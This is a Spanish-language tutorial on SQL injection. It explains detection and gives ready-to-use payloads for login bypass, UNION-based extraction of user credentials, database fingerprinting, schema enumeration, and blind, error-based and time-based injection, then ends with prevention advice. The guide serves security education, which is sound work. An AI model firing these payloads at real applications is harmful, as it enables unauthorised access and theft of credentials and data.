# Inyecciones SQLi (SQL Injection)


---

##  Introducción

En este documento examinaremos de forma práctica y didáctica las vulnerabilidades en bases de datos SQL —conocidas como **inyecciones SQL (SQLi)**—. Las inyecciones SQL consisten en la inserción de consultas o comandos maliciosos en puntos de entrada de una aplicación web, aprovechando validaciones insuficientes para alterar la lógica de ejecución en sistemas de gestión de bases de datos como [Mariadb](../SQL/Mariadb) o [SQLite3](../SQL/SQLite3/). Cuando estas técnicas se aplican en entornos de producción web, pueden permitir desde la exfiltración de información sensible hasta la modificación no autorizada del comportamiento de la aplicación, afectando la confidencialidad, integridad y disponibilidad de los datos. Para ampliar el contexto teórico y práctico, consulta la sección general sobre [Bases de datos](../../Bases%20de%20datos/).

[Visitar apartado sobre SQLi](../../SQLi)

Objetivos de este capítulo:

- Entender qué es una inyección SQL y cómo se explota.

- Identificar vectores típicos y entradas vulnerables en aplicaciones web.


---

## ¿Qué es la inyección SQL?

> La inyección SQL (**SQLi**) es una vulnerabilidad que permite a un atacante manipular las consultas SQL de una aplicación para acceder, modificar o eliminar datos en una base de datos. Se produce cuando la entrada del usuario no se valida ni se sanitiza correctamente, permitiendo la ejecución de código SQL malicioso.


---

## Cómo detectar vulnerabilidades de inyección SQL

Algunos métodos para identificar si una aplicación es vulnerable a SQLi incluyen:

- **Pruebas manuales:** Insertar caracteres especiales (`'`, `"`, `;`, `--`, `#`, etc.) en los campos de entrada y observar errores.
- **Errores de la base de datos:** Mensajes como `syntax error` pueden indicar una vulnerabilidad.
- **Automatización:** Uso de herramientas como [SQLmap](sqlmap.md) para detectar y explotar SQLi.


---

## Recuperar datos ocultos

A veces, los datos de la base de datos están ocultos, pero la inyección SQL puede revelar información oculta al modificar consultas, por ejemplo:

```sql
SELECT * FROM productos WHERE id = '1' OR '1'='1';
```

```url
' OR 1=1-- -
```

```url
' OR '1'='1
```


---

## Subvertir la lógica de la aplicación

Los atacantes pueden modificar consultas para eludir la autenticación:

```sql
SELECT * FROM usuarios WHERE usuario = 'admin' AND clave = '' OR '1'='1';
```

Esto permite iniciar sesión sin conocer la contraseña real.

```lua
Username = admin' OR 1=1-- -
Password = ' OR 1=1-- -
```


---

## Inyección SQL UNION attacks

Permite unir múltiples consultas SQL para extraer datos de otras tablas.

### Determinar el número de columnas requeridas

```sql
ORDER BY nº; -- Probamos incrementando 'n' hasta encontrar un error
```

```url
' ORDER BY nº-- -
```

### Encontrar columnas con un tipo de datos útil

```sql
UNION SELECT NULL, NULL, 'texto';
```

```url
' UNION SELECT NULL,NULL,'test'-- -
```


### Uso de un ataque UNION de inyección SQL para recuperar datos interesantes

```sql
UNION SELECT nombre, clave FROM usuarios;
```

```url
' UNION SELECT nombre,clave FROM usuarios-- -
```


### Recuperar múltiples valores dentro de una sola columna

```sql
UNION SELECT nombre || ' - ' || clave FROM usuarios;
```

```url
' UNION SELECT nombre || ' - ' || clave FROM usuarios-- -
```

---

## Examinar la base de datos

Los atacantes pueden obtener información sobre la estructura de la base de datos.

### Identificar la base de datos en uso

```url
' UNION SELECT @@version-- -  # Para MySQL
' UNION SELECT version()-- -  # Para PostgreSQL
' UNION SELECT banner FROM v$version-- -  # Para Oracle
```

### Listar tablas y columnas

```url
' UNION SELECT table_name FROM information_schema.tables-- -
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='usuarios'-- -
```


---

## Inyección SQL ciega

Cuando la aplicación no devuelve errores directos, se pueden usar técnicas como:

### Explotar la inyección SQL ciega desencadenando respuestas condicionales

```sql
AND 1=1 -- [Devuelve verdadero]
AND 1=2 -- [Devuelve falso]
```

### Inyección SQL basada en errores

Forzar la aplicación a mostrar errores:

```sql
AND 1=CAST((SELECT clave FROM usuarios LIMIT 1) AS INT);
```

### Explotar la inyección SQL ciega desencadenando retrasos de tiempo

```sql
IF(1=1, SLEEP(5), 0);
```

### Explotar la inyección SQL ciega utilizando técnicas fuera de banda (OAST)

Enviar consultas a servidores externos para filtrar datos.

---

## Inyección SQL en diferentes contextos

- **En URLs:** `https://victima.com/perfil?id=1' OR '1'='1`.
- **En formularios:** Campos de login vulnerables.
- **En encabezados HTTP:** Manipulación de cookies o User-Agent.


---

## Inyección SQL de segundo orden

Los datos maliciosos se almacenan en la base de datos y ejecutan la inyección en otro contexto.

Ejemplo: Un usuario malicioso registra su nombre como:

```sql
admin' --
```
Cuando un administrador lo consulta en otra página, la inyección se ejecuta.


---

##  Cómo prevenir la inyección SQL

**Usar consultas preparadas** con `?` o `bind_param()`:

```sql
SELECT * FROM usuarios WHERE usuario = ? AND clave = ?;
```

**Validar y sanitizar entradas del usuario.**
**Principio de menor privilegio:** No usar cuentas con permisos excesivos.
**Firewalls de aplicaciones web (WAF).**


---

**Conclusión:** La inyección SQL sigue siendo una de las vulnerabilidades más peligrosas, pero con buenas prácticas y medidas de seguridad adecuadas, se puede mitigar el riesgo de ataque.
